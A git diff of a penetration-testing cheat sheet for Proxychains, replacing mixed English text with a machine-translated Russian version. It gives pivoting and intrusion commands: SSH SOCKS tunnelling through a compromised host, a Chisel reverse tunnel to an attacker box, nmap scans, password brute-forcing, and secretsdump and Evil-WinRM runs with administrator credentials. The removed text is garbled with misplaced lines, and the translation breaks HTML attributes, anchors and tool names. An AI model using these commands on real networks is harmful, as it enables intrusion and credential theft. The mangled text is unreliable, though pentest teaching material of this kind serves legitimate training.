@@ -1,12 +1,16 @@
-# ⛓️ Proxychains — полная шпаргалка
-
 <!-- language-home-navigation -->
 [🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇬🇧 English](../README.md) • [🇷🇺 Русский раздел](../../README.ru.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# ⛓️ Проксичейны — полная шпаргалка
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
   ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗ ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗
   ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝
@@ -16,54 +20,52 @@
   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
        Force Any TCP Connection Through SOCKS4, SOCKS5, and HTTP Proxies
 ```
-
-<p align="center">
+<p выравнивание="центр">
   <img src="https://img.shields.io/badge/Proxychains-Proxychains--NG-blue?style=for-the-badge" alt="Proxychains">
-  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunneling-orange?style=for-the-badge" alt="Pivoting & Tunneling">
-  <img src="https://img.shields.io/badge/Protocols-SOCKS4_SOCKS5_HTTP-green?style=for-the-badge" alt="Protocols">
-  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
+  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunneling-orange?style=for-the-badge" alt="Поворот и туннелирование">
+  <img src="https://img.shields.io/badge/Protocols-SOCKS4_SOCKS5_HTTP-green?style=for-the-badge" alt="Протоколы">
+  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Лицензия GPLv2">
 </p>
 
-<p align="center">
-  <b>🌐 Route standard Linux CLI networking tools dynamically through multi-hop SOCKS and HTTP proxies via LD_PRELOAD</b>
+<p выравнивание="центр">
+  <b>🌐 Динамически маршрутизируйте стандартные сетевые инструменты Linux CLI через многоинтервальные SOCKS и HTTP-прокси через LD_PRELOAD</b>
 </p>
 
 ---
 
 ## 📋 Содержание
 
-- [Введение](#-overview--how-proxychains-works)
-- [Установка](#-installation)
-- [Configuration Files & Lookup Hierarchy](#-configuration-files--lookup-hierarchy)
-- [Chaining Modes Explained](#-chaining-modes-explained)
-  - [` `dynamic_chain` (Recommended)](#dynamic_chain-recommended)
-  - [` `strict_chain`](#strict_chain)
-  - [` `round_robin_chain`](#round_robin_chain)
-  - [` `random_chain`](#random_chain)
-- [DNS Leaks Prevention (`proxy_dns`)](#-dns-leaks-prevention-proxy_dns)
-- [Configuring Proxy Lists](#-configuring-proxy-lists)
-- [Pivoting Workflows](#-pivoting-workflows)
+- [Обзор и как работают Proxychains](#-overview--how-proxychains-works)
+- [Установка](#-установка)
+- [Файлы конфигурации и иерархия поиска](#-configuration-files--lookup-hierarchy)
+- [Объяснение режимов цепочки] (#-объяснение режимов цепочки)
+  - [`dynamic_chain` (рекомендуется)](#dynamic_chain-рекомендуется)
+  - [`strict_chain`](#strict_chain)
+  - [`round_robin_chain`](#round_robin_chain)
+  - [`random_chain`](#random_chain)
+- [Предотвращение утечек DNS (`proxy_dns`)](#-dns-leaks-prevention-proxy_dns)
+- [Настройка списков прокси](#-configuring-proxy-lists)
+- [Рабочие процессы поворота](#-pivoting-workflows)
   - [SSH Dynamic SOCKS Proxy (`ssh -D`)](#ssh-dynamic-socks-proxy-ssh--d)
-  - [🚀 Pivoting Workflows](#chisel--ligolo-ng-socks-relay)
-- [Tool Integration & Gotchas](#-tool-integration--gotchas)
-  - [Nmap with Proxychains (Why `-sS` Fails)](#nmap-with-proxychains-why--ss-fails)
-  - [Active Directory Tools (NetExec, Evil-WinRM, Impacket)](#active-directory-tools-netexec-evil-winrm-impacket)
-- [Краткий справочник](#-quick-reference-table)
-- [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
-- [Legal Disclaimer](#-legal-disclaimer)
+  - [Долото и реле Ligolo-ng SOCKS](#chisel--ligolo-ng-socks-relay)
+- [Интеграция инструментов и ошибки](#-tool-integration--gotchas)
+  - [Nmap с Proxychains (Почему `-sS` не работает)](#nmap-with-proxychains-why--ss-fails)
+  - [Инструменты Active Directory (NetExec, Evil-WinRM, Impacket)](#active-directory-tools-netexec-evil-winrm-impacket)
+- [Краткая справочная таблица](#-краткая справочная-таблица)
+- [Защитные соображения и OPSEC](#-защитные-соображения--opsec)
+- [Юридическая оговорка](#-юридическая оговорка)
 
 ---
 
-## 🎯 Введение
+## 🎯 Обзор и как работают проксичейны
 
-**Proxychains** (modern active fork: **Proxychains-NG** / `proxychains4`) allows running any dynamic command through single or multiple chained SOCKS4, SOCKS5, or HTTP(S) proxies.
+**Proxychains** (современная активная версия: **Proxychains-NG** / `proxychains4`) позволяет запускать любую динамическую команду через один или несколько связанных прокси-серверов SOCKS4, SOCKS5 или HTTP(S).
 
-It functions by preloading a custom hook library (`libproxychains4.so`) using the dynamic linker mechanism (`LD_PRELOAD`). This intercepts socket API calls (`connect()`, `gethostbyname()`) made by target applications and redirects their TCP traffic into the configured proxy chain transparently.
+Он функционирует путем предварительной загрузки специальной библиотеки перехватчиков (`libproxychains4.so`) с использованием механизма динамического компоновщика (`LD_PRELOAD`). Это перехватывает вызовы API сокетов (`connect()`, `gethostbyname()`), выполняемые целевыми приложениями, и прозрачно перенаправляет их TCP-трафик в настроенную цепочку прокси.
 
 ---
 
 ## 📥 Установка
-
 ```bash
 # Debian / Ubuntu / Kali Linux
 sudo apt update && sudo apt install -y proxychains4
@@ -74,55 +76,51 @@ sudo pacman -S proxychains-ng
 # macOS (Homebrew)
 brew install proxychains-ng
 ```
-
 ---
 
-## ⚙️ Configuration Files & Lookup Hierarchy
+## ⚙️ Файлы конфигурации и иерархия поиска
 
-Proxychains searches for its configuration file in the following strict order of priority:
+Proxychains ищет свой файл конфигурации в следующем строгом порядке приоритета:
 
-1. Path set in `PROXYCHAINS_CONF_FILE` environment variable.
-2. File passed via the `-f` flag (`proxychains4 -f ./myproxy.conf <command>`).
-⚙️ Configuration Files & Lookup Hierarchy
+1. Путь установлен в переменной среды `PROXYCHAINS_CONF_FILE`.
+2. Файл передается через флаг `-f` (`proxychains4 -f ./myproxy.conf <command>`).
+3. `./proxychains.conf` в текущем рабочем каталоге.
 4. `$(HOME)/.proxychains/proxychains.conf`.
-Proxychains searches for its configuration file in the following strict order of priority:
+5. `/etc/proxychains4.conf` (системное значение по умолчанию).
 
 ---
 
-## 🔗 Chaining Modes Explained
+## 🔗 Объяснение режимов цепочки
 
-5. `/etc/proxychains4.conf` (System default).
+Отредактируйте `/etc/proxychains4.conf`, чтобы выбрать алгоритм маршрутизации цепочки:
 
-### ` dynamic_chain` (Recommended)
-Skips dead proxies in the list automatically without aborting the connection. If Proxy #1 is up, Proxy #2 is down, and Proxy #3 is up, traffic routes through 1 -> 3.
+### `dynamic_chain` (рекомендуется)
+Автоматически пропускает мертвые прокси в списке, не прерывая соединение. Если прокси-сервер №1 включен, прокси-сервер №2 отключен и прокси-сервер №3 включен, трафик проходит через 1 -> 3.
 ```ini
 dynamic_chain
 # strict_chain
 ```
-
-### ` strict_chain`
-Strictly follows the configured proxy order. If any proxy in the chain fails or times out, the entire connection is refused.
+### `strict_chain`
+Строго следует настроенному порядку прокси. Если какой-либо прокси-сервер в цепочке выходит из строя или истекает время ожидания, все соединение отклоняется.
 ```ini
 strict_chain
 ```
-
-### ` round_robin_chain`
-Cycles through the proxy list sequentially for every new connection request.
+### `round_robin_chain`
+Последовательно перебирает список прокси для каждого нового запроса на соединение.
 ```ini
 round_robin_chain
 chain_len = 2
 ```
-
-### ` random_chain`
-Randomly selects proxies from the list up to `chain_len`.
+### `random_chain`
+Случайным образом выбирает прокси из списка до `chain_len`.
 
 ---
 
-## 🛡️ DNS Leaks Prevention (`proxy_dns`)
+## 🛡️ Предотвращение утечек DNS (`proxy_dns`)
 
-One of the most dangerous OPSEC failures during external reconnaissance or internal pivoting is leaking DNS queries to the local ISP or target gateway.
+Одним из наиболее опасных сбоев OPSEC во время внешней разведки или внутреннего поворота является утечка DNS-запросов к локальному интернет-провайдеру или целевому шлюзу.
 
-Ensure `proxy_dns` is active in `/etc/proxychains4.conf`:
+Убедитесь, что `proxy_dns` активен в `/etc/proxychains4.conf`:
 ```ini
 # Proxy all DNS requests through SOCKS5 proxy
 proxy_dns
@@ -130,13 +128,11 @@ proxy_dns
 # Suppress annoying hook library stdout logs
 quiet_mode
 ```
-
 ---
 
-## 📝 Configuring Proxy Lists
+## 📝 Настройка списков прокси
 
-At the bottom of `/etc/proxychains4.conf`, under `[ProxyList]`:
-
+Внизу `/etc/proxychains4.conf`, под `[ProxyList]`:
 ```ini
 [ProxyList]
 # Protocol   IP               Port   [Username]  [Password]
@@ -144,13 +140,11 @@ socks5       127.0.0.1        1080
 socks4       192.168.1.100    1080
 http         10.10.10.50      8080   admin       SecretPass123
 ```
-
 ---
 
-## 🚀 Pivoting Workflows
+## 🚀 Поворот рабочих процессов
 
-### SSH Dynamic SOCKS Proxy (`ssh -D`)
-
+### SSH Динамический SOCKS-прокси (`ssh -D`)
 ```bash
 # 1. Open background dynamic SOCKS5 proxy on local port 1080 through compromised pivot host
 ssh -f -N -D 127.0.0.1:1080 user@10.10.10.50
@@ -161,10 +155,9 @@ ssh -f -N -D 127.0.0.1:1080 user@10.10.10.50
 # 3. Access internal machines unreachable directly from attacker box
 proxychains4 curl http://172.16.20.10
 ```
+### Зубило и Ligolo-ng SOCKS Эстафета
 
-### 🚀 Pivoting Workflows
-
-SSH Dynamic SOCKS Proxy (`ssh -D`)
+При запуске клиент-серверных туннелей Chisel:
 ```bash
 # Connect Chisel client with reverse SOCKS
 chisel client 10.10.14.5:8000 R:1080:socks
@@ -172,16 +165,14 @@ chisel client 10.10.14.5:8000 R:1080:socks
 # Route tools through Chisel tunnel
 proxychains4 crackmapexec smb 172.16.50.0/24
 ```
-
 ---
 
-## ⚠️ Tool Integration & Gotchas
+## ⚠️ Интеграция инструментов и ошибки
 
-### Nmap with Proxychains (Why `-sS` Fails)
+### Nmap с проксичейнами (почему `-sS` не работает)
 
-|**Pipe to Hydra**|`crunch 7 7 -t User%%% \|hydra -l user -P - <IP> ssh`|
-> SOCKS proxies only support established TCP sessions. **SYN Stealth Scans (`-sS`) will fail or hang** because they require raw socket manipulation not supported over SOCKS!
-
+> [!ВНИМАНИЕ]
+> Прокси SOCKS поддерживают только установленные сеансы TCP. **Скрытое сканирование SYN (`-sS`) завершится сбоем или зависнет**, поскольку оно требует манипуляций с необработанными сокетами, которые не поддерживаются в SOCKS!
 ```bash
 # Correct Nmap command with Proxychains (Full TCP Connect, No Ping, No DNS)
 proxychains4 nmap -sT -Pn -n -sV -p 80,443,445,3389 172.16.20.10
@@ -189,9 +180,7 @@ proxychains4 nmap -sT -Pn -n -sV -p 80,443,445,3389 172.16.20.10
 # Scan Top 100 ports over proxy
 proxychains4 nmap -sT -Pn -n --top-ports 100 172.16.20.10
 ```
-
-### Active Directory Tools (NetExec, Evil-WinRM, Impacket)
-
+### Инструменты Active Directory (NetExec, Evil-WinRM, Impacket)
 ```bash
 # SMB enumeration through internal pivot
 proxychains4 nxc smb 172.16.20.10 -u Administrator -p 'Password123'
@@ -202,32 +191,31 @@ proxychains4 evil-winrm -i 172.16.20.10 -u Administrator -p 'Password123'
 # Impacket secretsdump over SOCKS proxy
 proxychains4 impacket-secretsdump domain.local/Administrator:Pass@172.16.20.10 -no-pass
 ```
-
 ---
 
-## ⚡ Краткий справочник
+## ⚡ Краткая справочная таблица
 
-|Objective|Команда|
+| Цель | Команда |
 |-----------|---------|
-|**Run Command via Proxy**|`proxychains4 <command> [args]`|
-|**Custom Config File**|`proxychains4 -f ./custom.conf <command>`|
-|**Quiet Execution (No banner)**|`proxychains4 -q <command>`|
-|**TCP Scan Internal Target**|`proxychains4 nmap -sT -Pn -n -p 80,445 <IP>`|
-|**Internal Web Request**|`proxychains4 curl -i http://<INTERNAL_IP>`|
-|**Internal SQLMap Test**|`proxychains4 sqlmap -u "http://<IP>/id=1" --batch`|
-|**Internal NetExec Probe**|`proxychains4 nxc smb <SUBNET>/24`|
+| **Выполнить команду через прокси** | `proxychains4 <command> [args]` |
+| **Пользовательский файл конфигурации** | `proxychains4 -f ./custom.conf <command>` |
+| **Тихая казнь (без баннера)** | `proxychains4 -q <command>` |
+| **Внутренняя цель TCP-сканирования** | `proxychains4 nmap -sT -Pn -n -p 80,445 <IP>` |
+| **Внутренний веб-запрос** | `proxychains4 curl -i http://<INTERNAL_IP>` |
+| **Внутренний тест SQLMap** | `proxychains4 sqlmap -u "http://<IP>/id=1" --batch` |
+| **Внутренний зонд NetExec** | `proxychains4 nxc smb <SUBNET>/24` |
 
 ---
 
-## 🛡️ Defensive Considerations & OPSEC
+## 🛡️ Оборонительные соображения и OPSEC
 
-1. **DNS Leaks:** If `proxy_dns` is commented out, your system will resolve hostnames via local DNS, alerting Blue Teams to targeted hostnames.
-2. **Speed & Latency:** Chaining multiple proxies compounds round-trip time (RTT). Set reasonable timeouts (`tcp_read_time_out 15000`, `tcp_connect_time_out 8000`).
-3. **Static Binaries:** Statically compiled binaries (e.g., Go/Rust binaries that do not link `libc.so`) bypass `LD_PRELOAD` hooks and will not be routed through Proxychains.
+1. **Утечки DNS:** Если `proxy_dns` закомментирован, ваша система будет разрешать имена хостов через локальный DNS, предупреждая Blue Teams о целевых именах хостов.
+2. **Скорость и задержка.** Объединение нескольких прокси-серверов увеличивает время прохождения сигнала туда и обратно (RTT). Установите разумные таймауты (`tcp_read_time_out 15000`, `tcp_connect_time_out 8000`).
+3. **Статические двоичные файлы:** Статически скомпилированные двоичные файлы (например, двоичные файлы Go/Rust, которые не связывают `libc.so`) обходят перехватчики `LD_PRELOAD` и не перенаправляются через Proxychains.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Юридическая оговорка
 
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> This cheatsheet is intended for authorized penetration testing, Red Team engagements, and educational research only. Routing traffic without authorization is strictly prohibited.
+> [!ВНИМАНИЕ]
+> Эта шпаргалка предназначена только для авторизованного тестирования на проникновение, участия Red Team и образовательных исследований. Маршрутизация трафика без авторизации строго запрещена.
